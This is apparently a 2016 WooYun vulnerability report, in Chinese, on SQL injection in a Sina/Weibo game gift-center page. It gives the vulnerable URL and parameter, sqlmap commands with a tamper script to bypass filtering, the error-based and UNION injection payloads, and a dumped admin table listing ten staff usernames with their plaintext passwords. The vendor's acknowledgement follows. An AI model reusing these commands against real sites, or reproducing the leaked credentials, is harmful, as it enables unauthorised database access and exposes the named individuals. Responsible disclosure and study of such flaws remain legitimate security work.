wybug_title: 新浪某站SQL注入(轻松绕过防御机制)
wybug_detail:
漏洞详情 披露状态：   									2016-04-17：	细节已通知厂商并且等待厂商处理中									2016-04-19：	厂商已经确认，细节仅向厂商公开									2016-04-29：	细节向核心白帽子及相关领域专家公开									2016-05-09：	细节向普通白帽子公开									2016-05-19：	细节向实习白帽子公开									2016-06-03：	细节向公众公开  简要描述： 求给12rank升级普通白帽子 详细说明：  注入点
http://game.weibo.com/home/giftcenter/allgift?id=1793466158
参数id未过滤引发了血案复现命令:
sqlmap.py -u "http://game.weibo.com/home/giftcenter/allgift?id=1793466158" --tamper ./tamper/concat2concatws.py
此处需加上混淆脚本,不然跑不出数据来(能检测到注入点)sqlmap证明:
fang@Attacker:~/FromGithub/sqlmap$ ./sqlmap.py -u "http://game.weibo.com/home/giftcenter/allgift?id=1793466158" ./tamper/concat2concatws.py --tables -T wyx_gift_info --columns         _ ___ ___| |_____ ___ ___  {1.0.4.4#dev}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 08:35:37[08:35:37] [INFO] resuming back-end DBMS 'mysql' [08:35:37] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: id (GET)    Type: error-based    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)    Payload: id=1793466158 AND EXTRACTVALUE(6947,CONCAT(0x5c,0x716a6a6a71,(SELECT (ELT(6947=6947,1))),0x717a766a71))    Type: UNION query    Title: Generic UNION query (NULL) - 13 columns    Payload: id=1793466158 UNION ALL SELECT CONCAT(0x716a6a6a71,0x6f5659514b6e66564a5a7269556c76696c4342737746577a69554b62706a6d5361464a6970517a48,0x717a766a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ----[08:35:37] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.1
泄露的是游戏礼品卡以及一些其他信息表名如下:

看了下管理员的密码 发现都是弱口令,好尴尬.你们这么大的厂也有弱口令...
Database: app_wyxwgTable: admin_manager[3 columns]+--------+-------------+| Column | Type        |+--------+-------------+| id     | numeric     || name   | non-numeric || passwd | non-numeric |+--------+-------------+[08:21:43] [INFO] fetching columns for table 'admin_manager' in database 'app_wyxwg'[08:21:44] [WARNING] the SQL query provided does not return any output[08:21:44] [WARNING] the SQL query provided does not return any output[08:21:44] [WARNING] unable to retrieve column names for table 'admin_manager' in database 'app_wyxwg'[08:21:44] [INFO] fetching entries for table 'admin_manager' in database 'app_wyxwg'[08:21:44] [INFO] the SQL query used returns 10 entries[08:21:44] [INFO] retrieved: "25","xinlangyouxi","xinlangyouxi888"[08:21:45] [INFO] retrieved: "8","lihuijuan","lihuijuan"[08:21:45] [INFO] retrieved: "36","gejiao","111111"[08:21:45] [INFO] retrieved: "35","jinjing","123456"[08:21:45] [INFO] retrieved: "34","xinghui","123456"[08:21:45] [INFO] retrieved: "40","zhuchongyang","zhuchongyang"[08:21:45] [INFO] retrieved: "42","chenyang3","111111"[08:21:45] [INFO] retrieved: "41","boqian","nirvana"[08:21:45] [INFO] retrieved: "39","jinchuan","jinchuan123"[08:21:46] [INFO] retrieved: "43","jialong3","jialong3"[08:21:46] [INFO] analyzing table dump for possible password hashes                Database: app_wyxwgTable: admin_manager[10 entries]+----+--------------+-----------------+| id | name         | passwd          |+----+--------------+-----------------+| 25 | xinlangyouxi | xinlangyouxi888 || 8  | lihuijuan    | lihuijuan       || 36 | gejiao       | 111111          || 35 | jinjing      | 123456          || 34 | xinghui      | 123456          || 40 | zhuchongyang | zhuchongyang    || 42 | chenyang3    | 111111          || 41 | boqian       | nirvana         || 39 | jinchuan     | jinchuan123     || 43 | jialong3     | jialong3        |+----+--------------+-----------------+

fang@Attacker:~/FromGithub/sqlmap$ ./sqlmap.py -u "http://game.weibo.com/home/giftcenter/allgift?id=1793466158" --is-dba ./tamper/concat2concatws.py  -T admin_manager --columns --dump         _ ___ ___| |_____ ___ ___  {1.0.4.4#dev}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 08:21:42[08:21:42] [INFO] resuming back-end DBMS 'mysql' [08:21:42] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: id (GET)    Type: error-based    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)    Payload: id=1793466158 AND EXTRACTVALUE(6947,CONCAT(0x5c,0x716a6a6a71,(SELECT (ELT(6947=6947,1))),0x717a766a71))    Type: UNION query    Title: Generic UNION query (NULL) - 13 columns    Payload: id=1793466158 UNION ALL SELECT CONCAT(0x716a6a6a71,0x6f5659514b6e66564a5a7269556c76696c4342737746577a69554b62706a6d5361464a6970517a48,0x717a766a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ----[08:21:43] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.1
   修复方案：  注入点不止一个.请自查修复另:求帮忙给12rank帮升普通白帽子   版权声明：转载请注明来源 方大核桃@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2016-04-19 17:02 厂商回复： 感谢关注新浪安全，将通知合作方进行修复。 最新状态： 暂无
